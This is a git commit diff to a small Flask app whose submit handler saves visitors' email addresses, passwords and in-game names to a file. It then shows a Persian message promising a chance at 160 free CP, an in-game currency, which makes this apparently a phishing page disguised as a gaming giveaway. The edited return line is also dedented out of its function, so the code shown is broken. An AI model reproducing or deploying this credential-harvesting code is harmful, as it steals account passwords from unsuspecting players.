4424440de647a8bc1f2596cd99a734ba268bcb2a
seyed-saeed <ssk1234kazemi@gmail.com>
2025-10-24 03:46:29 +0330

    Update app.py

--- app.py
+++ app.py
@@ -35,13 +35,9 @@ def submit():
         f.write(f"ایمیل: {email}\n")
         f.write(f"رمز عبور: {password}\n")
         f.write(f"نام در بازی: {gamename}\n")
-
-    return render_template('index.html', message="افرم شما با موفقیت ثبت گردید.
-در صورت انتخاب به‌عنوان فرد برنده، هدیه‌ای شامل ۱۶۰ سی‌پی رایگان به شما تعلق خواهد گرفت.
-
-
-")
+return render_template('index.html', message="فرم شما با موفقیت ثبت گردید. در صورت انتخاب به‌عنوان فرد برنده، هدیه‌ای شامل ۱۶۰ سی‌پی رایگان به شما تعلق خواهد گرفت.")
 
 if __name__ == '__main__':
 
     app.run()
+
